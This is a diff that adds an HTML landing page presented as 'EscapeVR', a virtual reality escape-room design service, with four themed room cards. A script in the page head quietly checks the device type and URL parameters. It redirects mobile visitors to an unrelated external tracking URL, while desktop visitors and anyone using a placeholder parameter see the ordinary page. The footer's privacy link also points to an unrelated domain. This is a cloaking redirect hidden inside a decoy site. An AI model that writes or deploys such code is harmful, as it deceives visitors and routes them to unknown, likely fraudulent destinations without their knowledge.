@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EscapeVR: Virtual Reality Escape Room Design Services</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400;700&display=swap');
+        
+        :root {
+            --primary-color: #00FFFF;
+            --secondary-color: #FF00FF;
+            --background-color: #1A1A2E;
+            --text-color: #E0E0E0;
+        }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background: linear-gradient(135deg, #00FFFF, #0080FF);
+            color: #1A1A2E;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            padding: 40px;
+        }
+        .room-card {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0, 255, 255, 0.2);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+        }
+        .room-card:hover {
+            transform: translateY(-10px) rotate(2deg);
+            box-shadow: 0 8px 16px rgba(0, 255, 255, 0.3);
+        }
+        .room-image {
+            height: 200px;
+            background-color: #16213E;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: #00FFFF;
+            position: relative;
+            overflow: hidden;
+        }
+        .room-image::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle, transparent 30%, #16213E 150%);
+            opacity: 0.7;
+        }
+        .room-info {
+            padding: 20px;
+        }
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 3.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        h2 {
+            font-family: 'Orbitron', sans-serif;
+            color: #00FFFF;
+            margin-top: 0;
+            font-size: 1.8em;
+            text-shadow: 0 0 10px #00FFFF;
+        }
+        p {
+            color: #B0E0E6;
+            line-height: 1.6;
+        }
+        .difficulty {
+            font-weight: bold;
+            color: #FF00FF;
+            font-size: 0.9em;
+            margin-top: 15px;
+        }
+        .theme {
+            background-color: #0080FF;
+            color: #1A1A2E;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .explore-button {
+            background-color: #FF00FF;
+            color: #1A1A2E;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 15px;
+            font-size: 1em;
+            font-weight: bold;
+            font-family: 'Orbitron', sans-serif;
+        }
+        .explore-button:hover {
+            background-color: #FF69B4;
+            transform: scale(1.05);
+        }
+        footer {
+            background: linear-gradient(135deg, #0080FF, #00FFFF);
+            color: #1A1A2E;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #16213E;
+            padding: 15px 0;
+            box-shadow: 0 2px 4px rgba(0, 255, 255, 0.1);
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav li {
+            margin: 0 20px;
+        }
+        nav a {
+            color: #00FFFF;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
+            font-family: 'Orbitron', sans-serif;
+        }
+        nav a:hover {
+            color: #FF00FF;
+            text-shadow: 0 0 10px #FF00FF;
+        }
+        footer a {
+            color: #1A1A2E;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>EscapeVR</h1>
+        <p>Immersive Virtual Reality Escape Room Experiences</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Our Rooms</a></li>
+            <li><a href="#">Custom Design</a></li>
+            <li><a href="#">About Us</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="room-card">
+            <div class="room-image">Cyberpunk Heist</div>
+            <div class="room-info">
+                <h2>Neon Nexus: Cyberpunk Heist</h2>
+                <p>Infiltrate a high-tech corporate vault in a futuristic cityscape.</p>
+                <span class="theme">Sci-Fi</span>
+                <p class="difficulty">Difficulty: Expert</p>
+                <button class="explore-button">Explore Room</button>
+            </div>
+        </div>
+        <div class="room-card">
+            <div class="room-image">Haunted Mansion</div>
+            <div class="room-info">
+                <h2>Phantom Manor: Victorian Horror</h2>
+                <p>Uncover the secrets of a haunted Victorian mansion and escape its ghostly residents.</p>
+                <span class="theme">Horror</span>
+                <p class="difficulty">Difficulty: Intermediate</p>
+                <button class="explore-button">Explore Room</button>
+            </div>
+        </div>
+        <div class="room-card">
+            <div class="room-image">Space Station</div>
+            <div class="room-info">
+                <h2>Cosmic Crisis: Space Station Escape</h2>
+                <p>Race against time to repair a damaged space station before oxygen runs out.</p>
+                <span class="theme">Sci-Fi</span>
+                <p class="difficulty">Difficulty: Advanced</p>
+                <button class="explore-button">Explore Room</button>
+            </div>
+        </div>
+        <div class="room-card">
+            <div class="room-image">Ancient Temple</div>
+            <div class="room-info">
+                <h2>Lost Civilization: Mayan Mystery</h2>
+                <p>Solve ancient puzzles to escape a Mayan temple before it collapses.</p>
+                <span class="theme">Adventure</span>
+                <p class="difficulty">Difficulty: Beginner</p>
+                <button class="explore-button">Explore Room</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 EscapeVR Virtual Reality Escape Room Design. Redefining immersive entertainment.</p>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
